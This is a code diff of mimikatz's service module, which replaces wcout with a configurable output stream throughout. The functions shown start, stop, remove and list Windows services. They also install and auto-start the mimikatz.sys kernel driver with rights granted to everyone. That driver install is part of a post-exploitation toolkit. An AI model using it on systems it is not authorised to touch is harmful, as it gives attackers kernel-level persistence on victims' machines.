@@ -18,19 +18,19 @@ vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_service::getMimiKatzComm
 
 bool mod_mimikatz_service::start(vector<wstring> * arguments)
 {
-	wcout << L"Démarrage de \'";
+	(*outputStream) << L"Démarrage de \'";
 	return genericFunction(mod_service::start, arguments);
 }
 
 bool mod_mimikatz_service::stop(vector<wstring> * arguments)
 {
-	wcout << L"Arrêt de \'";
+	(*outputStream) << L"Arrêt de \'";
 	return genericFunction(mod_service::stop, arguments);
 }
 
 bool mod_mimikatz_service::remove(vector<wstring> * arguments)
 {
-	wcout << L"Suppression de \'";
+	(*outputStream) << L"Suppression de \'";
 	return genericFunction(mod_service::remove, arguments);
 }
 
@@ -38,14 +38,14 @@ bool mod_mimikatz_service::genericFunction(PMOD_SERVICE_FUNC function, vector<ws
 {
 	if(!arguments->empty())
 	{
-		wcout << arguments->front() << L"\' : ";
+		(*outputStream) << arguments->front() << L"\' : ";
 		if(function(&arguments->front(), NULL))
-			wcout << L"OK";
+			(*outputStream) << L"OK";
 		else
-			wcout << L"KO ; " << mod_system::getWinError();
-		wcout << endl;
+			(*outputStream) << L"KO ; " << mod_system::getWinError();
+		(*outputStream) << endl;
 	}
-	else wcout << L"(null)\' - KO ; Nom de service manquant" << endl;
+	else (*outputStream) << L"(null)\' - KO ; Nom de service manquant" << endl;
 
 	return true;
 }
@@ -83,46 +83,46 @@ bool mod_mimikatz_service::list(vector<wstring> * arguments)
 			  )
 			{			
 				if(monService->ServiceStatusProcess.dwProcessId != 0)
-					wcout << setw(5) << setfill(wchar_t(' ')) << monService->ServiceStatusProcess.dwProcessId;
-				wcout << L'\t';
+					(*outputStream) << setw(5) << setfill(wchar_t(' ')) << monService->ServiceStatusProcess.dwProcessId;
+				(*outputStream) << L'\t';
 				
 				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_INTERACTIVE_PROCESS)
-					wcout << L"INTERACTIVE_PROCESS" << L'\t';
+					(*outputStream) << L"INTERACTIVE_PROCESS" << L'\t';
 				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_FILE_SYSTEM_DRIVER)
-					wcout << L"FILE_SYSTEM_DRIVER" << L'\t';
+					(*outputStream) << L"FILE_SYSTEM_DRIVER" << L'\t';
 				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_KERNEL_DRIVER)
-					wcout << L"KERNEL_DRIVER" << L'\t';
+					(*outputStream) << L"KERNEL_DRIVER" << L'\t';
 				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_WIN32_OWN_PROCESS)
-					wcout << L"WIN32_OWN_PROCESS" << L'\t';
+					(*outputStream) << L"WIN32_OWN_PROCESS" << L'\t';
 				if(monService->ServiceStatusProcess.dwServiceType & SERVICE_WIN32_SHARE_PROCESS)
-					wcout << L"WIN32_SHARE_PROCESS" << L'\t';
+					(*outputStream) << L"WIN32_SHARE_PROCESS" << L'\t';
 
 				switch(monService->ServiceStatusProcess.dwCurrentState)
 				{
 					case SERVICE_CONTINUE_PENDING:
-						wcout << L"CONTINUE_PENDING";
+						(*outputStream) << L"CONTINUE_PENDING";
 						break;
 					case SERVICE_PAUSE_PENDING:
-						wcout << L"PAUSE_PENDING";
+						(*outputStream) << L"PAUSE_PENDING";
 						break;
 					case SERVICE_PAUSED:
-						wcout << L"PAUSED";
+						(*outputStream) << L"PAUSED";
 						break;
 					case SERVICE_RUNNING:
-						wcout << L"RUNNING";
+						(*outputStream) << L"RUNNING";
 						break;
 					case SERVICE_START_PENDING:
-						wcout << L"START_PENDING";
+						(*outputStream) << L"START_PENDING";
 						break;
 					case SERVICE_STOP_PENDING:
-						wcout << L"STOP_PENDING";
+						(*outputStream) << L"STOP_PENDING";
 						break;
 					case SERVICE_STOPPED:
-						wcout << L"STOPPED";
+						(*outputStream) << L"STOPPED";
 						break;
 				}
 
-				wcout << L'\t' <<
+				(*outputStream) << L'\t' <<
 					monService->serviceName << L'\t' <<
 					monService->serviceDisplayName <<
 					endl;
@@ -130,7 +130,7 @@ bool mod_mimikatz_service::list(vector<wstring> * arguments)
 		}
 	}
 	else
-		wcout << L"mod_service::getList ; " << mod_system::getWinError() << endl;
+		(*outputStream) << L"mod_service::getList ; " << mod_system::getWinError() << endl;
 			
 	delete vectorServices;
 	return true;
@@ -145,7 +145,7 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 		{
 			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
 			{
-				wcout << L"[*] Pilote mimikatz non présent, installation." << endl;
+				(*outputStream) << L"[*] Pilote mimikatz non présent, installation." << endl;
 				
 				wstring monPilote = L"mimikatz.sys";
 				wstring monPiloteComplet = L"";
@@ -156,35 +156,35 @@ bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
 					{
 						if(monService = CreateService(monManager, L"mimikatz", L"mimikatz driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
 						{
-							wcout << L"[+] Création du pilote : OK" << endl;
+							(*outputStream) << L"[+] Création du pilote : OK" << endl;
 							if(mod_secacl::addWorldToMimikatz(&monService))
-								wcout << L"[+] Attribution des droits : OK";
+								(*outputStream) << L"[+] Attribution des droits : OK";
 							else
-								wcout << L"[-] Attribution des droits : KO ; " << mod_system::getWinError();
-							wcout << endl;
+								(*outputStream) << L"[-] Attribution des droits : KO ; " << mod_system::getWinError();
+							(*outputStream) << endl;
 						}
-						else wcout << L"[!] Impossible de créer le pilote ; " << mod_system::getWinError() << endl;
+						else (*outputStream) << L"[!] Impossible de créer le pilote ; " << mod_system::getWinError() << endl;
 					}
-					else wcout << L"[!] Le pilote ne semble pas exister ; " << mod_system::getWinError() << endl;
+					else (*outputStream) << L"[!] Le pilote ne semble pas exister ; " << mod_system::getWinError() << endl;
 				}
-				else wcout << L"[!] Impossible d\'obtenir le chemin absolu du pilote ; " << mod_system::getWinError() << endl;
+				else (*outputStream) << L"[!] Impossible d\'obtenir le chemin absolu du pilote ; " << mod_system::getWinError() << endl;
 			}
-			else wcout << L"[!] Ouverture du pilote mimikatz : KO ; " << mod_system::getWinError() << endl;
+			else (*outputStream) << L"[!] Ouverture du pilote mimikatz : KO ; " << mod_system::getWinError() << endl;
 		}
-		else wcout << L"[*] Pilote mimikatz déjà présent" << endl;
+		else (*outputStream) << L"[*] Pilote mimikatz déjà présent" << endl;
 		
 		if(monService)
 		{
 			if(StartService(monService, 0, NULL) != 0)
-				wcout << L"[+] Démarrage du pilote : OK";
+				(*outputStream) << L"[+] Démarrage du pilote : OK";
 			else
-				wcout << L"[-] Démarrage du pilote : KO ; " << mod_system::getWinError();
-			wcout << endl;
+				(*outputStream) << L"[-] Démarrage du pilote : KO ; " << mod_system::getWinError();
+			(*outputStream) << endl;
 			CloseServiceHandle(monService);
 		}
 		
 		CloseServiceHandle(monManager);
 	}
-	else wcout << L"[!] Impossible d\'ouvrir le gestionnaire de service pour création ; " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"[!] Impossible d\'ouvrir le gestionnaire de service pour création ; " << mod_system::getWinError() << endl;
 	return true;
 }
